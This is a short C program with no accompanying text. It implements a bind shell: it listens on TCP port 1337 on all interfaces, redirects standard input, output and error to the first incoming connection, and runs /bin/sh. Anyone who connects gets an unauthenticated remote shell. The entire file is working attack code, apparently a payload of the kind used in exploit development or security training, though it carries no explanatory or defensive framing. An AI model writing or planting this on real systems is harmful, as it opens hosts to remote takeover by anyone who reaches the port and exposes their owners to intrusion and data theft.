#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>


int main(void){
    int bind_port = 1337;
    //Create a socket.
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    //bind socket on specific port
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bind_port);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(socket_fd,(struct sockaddr *)&addr, sizeof(addr));


    //Listen
    listen(socket_fd,0);


    //Accept connections
    int connected_socket_fd = accept(socket_fd, NULL, NULL);


    //dup2 3 times for stdin stdout and stderr
    dup2(connected_socket_fd, STDIN_FILENO);
    dup2(connected_socket_fd, STDOUT_FILENO);
    dup2(connected_socket_fd, STDERR_FILENO);


    //launch /bin/sh
    execve("/bin/sh", NULL, NULL);

}
